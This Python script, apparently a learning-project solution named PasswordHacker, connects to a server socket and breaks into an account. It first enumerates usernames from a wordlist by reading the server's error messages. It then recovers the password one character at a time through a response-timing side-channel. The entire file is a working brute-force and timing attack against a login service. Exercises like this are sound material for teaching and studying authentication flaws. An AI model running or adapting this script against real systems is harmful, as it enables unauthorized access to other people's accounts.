import socket
import argparse
import json
from datetime import datetime


class PasswordHacker:

    def __init__(self):
        self.ip_address = ""
        self.port = None
        self.message_to_send = ""
        self.az_09 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        self.login_dict = {"login": "", "password": " "}
        self.username = ""
        self.password = ""

    def main(self, ip, port):
        client_socket = socket.socket()
        client_socket.connect((ip, port))
        username_file = open(r".\hacking\logins.txt", "r")
        usernames = username_file.readlines()
        #  finding the correct username
        for username in usernames:
            self.login_dict["login"] = username.strip("\n")
            with open("message.json", "w") as json_file:
                message = json.dumps(self.login_dict)
                client_socket.send(message.encode(encoding="utf=8"))
                response = json.loads(client_socket.recv(1024).decode(encoding="utf-8"))
                if response == {"result": "Wrong login!"}:
                    continue
                elif response == {"result": "Wrong password!"}:
                    self.username = self.login_dict["login"]
                    break
        #  finding the correct password
        for x in range(1, 63):
            curr_password = self.password
            for letter in self.az_09:
                curr_password += letter
                self.login_dict["password"] = curr_password
                message = json.dumps(self.login_dict)
                client_socket.send(message.encode(encoding="utf-8"))
                star_time = datetime.now()
                response = json.loads(client_socket.recv(1024).decode(encoding="utf-8"))
                end_time = datetime.now()
                response_time = end_time - star_time
                if response_time.microseconds >= 90000 and response["result"] == "Wrong password!":
                    self.password = curr_password
                    break
                elif response["result"] == "Wrong password!":
                    curr_password = curr_password[:-1]
                    continue
                elif response["result"] == "Connection success!":
                    self.password = curr_password
                    print(message)
                    exit()

        username_file.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ipaddress")
    parser.add_argument("port", type=int)
    args = parser.parse_args()
    test = PasswordHacker()
    test.main(args.ipaddress, args.port)
